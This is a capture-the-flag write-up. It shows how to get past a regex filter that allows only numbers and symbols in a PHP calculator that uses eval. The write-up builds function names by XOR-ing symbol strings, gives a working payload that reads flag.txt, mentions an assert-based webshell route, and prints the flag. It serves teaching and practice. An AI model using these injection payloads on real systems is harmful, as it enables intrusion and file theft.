# Writeup  
We have a form to insert equations into; it will evaluate them and return back
the result.

![landing_page](https://github.com/pwnthenope/pwnthenope.github.io/blob/main/static/post_images/most_secure_calculator_2.png?raw=true)

In source page's HTML comments, we can see that only number and special chars
are allowed:

```  
<--  
Hi Selina,  
I learned about regex today. I have upgraded the previous calculator. Now its
the most secure calculator ever.  
The calculator accepts only numbers and symbols.  
I have hidden some interesting things in flag.txt and I know you can create an
interesting equation to read that file.  
-->  
```

By interacting with the site, we can also learn that the maximum number of
characters allowed in an equation is 79.

We also learn, by submitting a single special char, that the equation is
evaluated using ```eval``` PHP function, for example from this warning:

```  
Result:  
Warning: Use of undefined constant _ - assumed '_' (this will throw an Error
in a future version of PHP) in /var/www/html/index.php(12) : eval()'d code on
line 1  
_  
```

We can inject code by using variable functions; but we have a problem: we can
only use built-in PHP functions as variable functions, because PHP ```eval```
actually doesn't allow variable functions.

For example we can use ```assert``` to escape from ```eval``` limitation on
variable functions, crafting some payload that results in
```assert($_POST[_])```; it would allow us to gain a webshell.

But there is chance that the code is in production mode, i.e.
```zend.assertions = -1``` (check PHP docs about assert).

So it's easier to craft a payload that results in
```file_get_contents("flag.txt")```.

A note about that: since we'll build the payload by putting strings together,
actually we don't need to craft the double quotes around ```flag.txt```.

Now, a strategy is the usage of XOR function to obtain alphabetic strings by
putting together strings composed of numbers and special chars.

For example:

```  
('%'^'`')  
```

Results in: ```E```.

Can we make a function call? Let's check out:

```  
('%'^'`')()  
```

The result is:

```  
Result :  
Fatal error: Uncaught Error: Call to undefined function E() in
/var/www/html/index.php(12) : eval()'d code:1 Stack trace: #0
/var/www/html/index.php(12): eval() #1 {main} thrown in
/var/www/html/index.php(12) : eval()'d code on line 1  
```

Perfect, now we have to obtain ```file_get_contents("flag.txt")```, without
double quotes and with a limit of 79 characters.

After some tries, the final, working payload is:

```  
('@@@@"_@@"@@@@@@@@'^'&),%}8%4}#/.4%.43')(("@@@_"^"&,!8").(".").("@@@"^"484"))  
```

And here's the flag:

```  
KCTF{sHoUlD_I_uSe_eVaL_lIkE_tHaT}  
```

Original writeup
(https://pwnthenope.github.io/writeups/2022/01/22/most_secure_calculator_2.html).